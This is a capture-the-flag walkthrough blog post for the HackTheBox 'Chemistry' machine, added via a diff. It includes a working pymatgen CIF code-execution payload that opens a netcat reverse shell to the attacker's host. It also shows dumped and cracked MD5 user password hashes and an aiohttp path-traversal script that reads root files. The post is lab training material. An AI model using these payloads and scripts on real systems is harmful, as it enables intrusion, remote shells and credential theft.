@@ -1,0 +1,178 @@
+---
+title: "HTB: Chemistry"
+date: 2024-12-21
+description: "Chemistry is a Linux machine that consists of exploiting CIF and AIOHttp 3.9.1 vulnerabilities."
+keywords: ["HTB", "HackTheBox", "Chemistry", "HTB Chemistry", "Chemistry.HTB"]
+draft: false
+---
+
+## Initial Foothold
+
+As always let's start off by running an nmap scan on the target.
+
+```bash
+kali@kali:~/HTB/Machines/Chemistry$ nmap -sV -sC -p- --min-rate=10000 10.129.108.102 -o nmap.result 
+...
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
+...
+5000/tcp open  upnp?
+...
+```
+
+The only interesting information that came from the nmap scan was there is an web application running on port 5000. So, let's add  `chemistry.htb` into our `/etc/hosts` file and then try accessing the web application.
+
+<img src="/assets/images/HTB-Chemistry/HTB-Chemistry-1.png" className="rounded-lg" />
+
+The web application allows us to login or register an account. I tried logging to the web application using default credentials such as: 
+
+* `admin:admin` 
+* `root:root`
+* `admin:root` 
+* `root:admin`
+* `admin:password`
+
+Unfortunately, none of the default credentials worked therefore I had to create an acctount. After playing around with the web application, I spotted that the web application is vulnerable for [PYMATGEN Remote Code Execution](https://github.com/materialsproject/pymatgen/security/advisories/GHSA-vgv8-5cpj-qj2f).
+
+```python title="CVE-2024-23346"
+data_5yOhtAoR
+_audit_creation_date            2018-06-08
+_audit_creation_method          "Pymatgen CIF Parser Arbitrary Code Execution Exploit"
+
+loop_
+_parent_propagation_vector.id
+_parent_propagation_vector.kxkykz
+k1 [0 0 0]
+
+_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("busybox nc [IP-ADDRESS] [PORT] -e /bin/bash");0,0,0'
+
+
+_space_group_magn.number_BNS  62.448
+_space_group_magn.name_BNS  "P  n'  m  a'  "   
+```
+
+You will need to modify `[IP-ADDRESS]` and `[PORT]` to your machine information.
+Once the `vuln.cif` file was uploaded Once the file was uploaded, I viewed it through the web application and successfully obtained remote code execution to machine.
+
+<img src="/assets/images/HTB-Chemistry/HTB-Chemistry-2.png" className="rounded-lg" />
+
+```bash title="Kali Linux: Netcat Listener"
+kali@kali:~/HTB/Machines/Chemistry$ rlwrap nc -lnvp 4444
+listening on [any] 4444 ...
+connect to [10.10.16.11] from (UNKNOWN) [10.129.108.102] 42710
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+app@chemistry:~$ whoami
+app
+app@chemistry:~$ hostname
+chemistry
+```
+
+I successfully managed to obtain a shell into the machine as app user. However, to read the user flag we need to elevate our privileges to user.
+
+## Road To User
+
+As always after obtaining a shell into the machine, I always check if there are any database files which are available for us. In this case the `database.db` was accessible for us therefore I decided to read the content of it using `sqlite3` which is already installed on the machine.
+
+``` bash
+app@chemistry:~/instance$ sqlite3 ./database.db
+SQLite version 3.31.1 2020-01-27 19:55:54
+Enter ".help" for usage hints.
+sqlite> .tables
+structure  user     
+sqlite> SELECT * FROM USER;
+1|admin|2861debaf8d99436a10ed6f75a252abf
+2|app|197865e46b878d9e74a0346b6d59886a
+3|rosa|63ed86ee9f624c7b14f1d4f43dc251a5
+4|robert|02fcf7cfc10adc37959fb21f06c6b467
+5|jobert|3dec299e06f7ed187bac06bd3b670ab2
+6|carlos|9ad48828b0955513f7cf0f7f6510c8f8
+7|peter|6845c17d298d95aa942127bdad2ceb9b
+8|victoria|c3601ad2286a4293868ec2a4bc606ba3
+9|tania|a4aa55e816205dc0389591c9f82f43bb
+10|eusebio|6cad48078d0241cca9a7b322ecd073b3
+11|gelacia|4af70c80b68267012ecdac9a7e916d18
+12|fabian|4e5d71f53fdd2eabdbabb233113b5dc0
+13|axel|9347f9724ca083b17e39555c36fd9007
+14|kristel|6896ba7b11a62cacffbdaded457c6d92
+15|root|63a9f0ea7bb98050796b649e85481845
+sqlite> 
+```
+
+Jackpot! I successfully managed to obtain the credentials of multiple of users. The password hashes are encrypted using MD5 algorithm and I decided to try cracking all the password hashes using Hashcat. 
+
+```bash
+kali@kali:~/Downloads$ hashcat -m 0 '63ed86ee9f624c7b14f1d4f43dc251a5' /usr/share/wordlists/rockyou.txt
+...
+63ed86ee9f624c7b14f1d4f43dc251a5:unicorniosrosados        
+...
+```
+
+Unfortunately, I was only able to crack the password hash of Rose. I decided to try logging in using the cracked password and it succeed without any issues and I was also able to read the user flag.
+
+```bash
+app@chemistry:~$ su rosa
+Password: unicorniosrosados
+rosa@chemistry:/home/app$ whoami
+rosa
+rosa@chemistry:/home/app$ hostname
+chemistry
+rosa@chemistry:/home/app$ cat /home/rosa/user.txt
+[USER FLAG]
+```
+
+## Road To Root
+
+I ran LinPEAS on the machine and quickly spotted that the machine was running another application inside `/opt/monitoring_tools` on port 8080. However, that web application is only accessible internally therefore I had to do port forwarding to access the web application.
+
+```
+kali@kali:~/HTB/Machines/Chemistry$ ssh -L :8080:127.0.0.1:8080 rosa@chemistry.htb 
+```
+
+Once the port forwarding was complete, I was able to access the web application without any isuses. It doesn't seem as the web application is capable of doing anything as none of the buttons works.
+
+<img src="/assets/images/HTB-Chemistry/HTB-Chemistry-3.png" className="rounded-lg" />
+
+I spent a bit time researching the web application and found out that it was running `aiohttp 3.9.1` which is a vulnerable for [CVE-2024-23334](https://github.com/z3rObyte/CVE-2024-23334-PoC) a path traversal exploit.
+
+<img src="/assets/images/HTB-Chemistry/HTB-Chemistry-4.png" className="rounded-lg" />
+
+I downloaded the `exploit.sh` from [CVE-2024-23334](https://github.com/z3rObyte/CVE-2024-23334-PoC) to my Kali Linux machine and I modified the `url` and `payload` section of the script to the following.
+
+```bash title="CVE-2024-23334: Path Traversal Exploit"
+#!/bin/bash
+
+url="http://localhost:8080"
+string="../"
+payload="/assets/"
+file="root/root.txt" # without the first /
+
+for ((i=0; i<15; i++)); do
+    payload+="$string"
+    echo "[+] Testing with $payload$file"
+    status_code=$(curl --path-as-is -s -o /dev/null -w "%{http_code}" "$url$payload$file")
+    echo -e "\tStatus code --> $status_code"
+    
+    if [[ $status_code -eq 200 ]]; then
+        curl -s --path-as-is "$url$payload$file"
+        break
+    fi
+done
+```
+
+After doing all the necessary modifications to the `exploit.sh` script. I executed it and it successfully man-aged to read the `root.txt` flag without any issues.
+
+```bash
+kali@kali:~/HTB/Machines/Chemistry$ ./exploit.sh
+[+] Testing with /assets/../root/root.txt
+        Status code --> 404
+[+] Testing with /assets/../../root/root.txt
+        Status code --> 404
+[+] Testing with /assets/../../../root/root.txt
+        Status code --> 200
+6c292ee364efc83fb8a5fe5058c8e150
+```
+
+If you're interested in obtaining a remote code execution as `root` than you can read the `/root/.ssh/id_rsa` file and login using SSH protocol.
+
+## Conclusion
+
+The Chemistry machine was interesting as it required me to research the functionalities of the web app-lication and the web application itself. The most important thing I learnt from the machine is always read the Burp Suite response headers and research it. I highly recommend this machine for people who are interested in increasing their researching capability within web applications.
